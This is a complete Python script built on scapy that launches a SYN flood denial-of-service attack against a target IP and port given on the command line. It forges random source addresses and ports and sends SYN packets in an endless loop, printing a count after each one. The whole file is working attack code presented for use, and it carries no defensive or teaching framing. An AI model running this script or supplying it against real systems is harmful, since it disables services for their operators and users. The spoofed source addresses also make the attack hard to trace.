import socket, random, sys
from scapy.all import *

from scapy.layers.inet import TCP, IP
from scapy.sendrecv import send


def sendSYN(target, port):
    #creating packet
    # insert IP header fields
    tcp = TCP()
    ip = IP()
    #set source IP as random valid IP
    ip.src = "%i.%i.%i.%i" % (random.randint(1,254),
    random.randint(1,254)
    ,random.randint(1,254),random.randint(1,254))
    ip.dst = target
    # insert TCP header fields
    tcp = TCP()
    #set source port as random valid port
    tcp.sport = random.randint(1,65535)
    tcp.dport = port
    #set SYN flag
    tcp.flags = "S"
    send(ip/tcp)
    return ;

#control arguments
if len(sys.argv) != 3:
    print ("Few␣argument:␣%s␣miss␣IP␣or␣miss␣PORT" % sys.argv[0])
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
count = 0
print ("Launch␣SYNFLOOD␣attack␣at␣%s:%i␣with␣SYN␣packets." % (target, port))
while 1:
    #call SYNFlood attack
    sendSYN(target,port)
    count += 1
    print("Total␣packets␣sent:␣%i" % count)
    print("==========================================")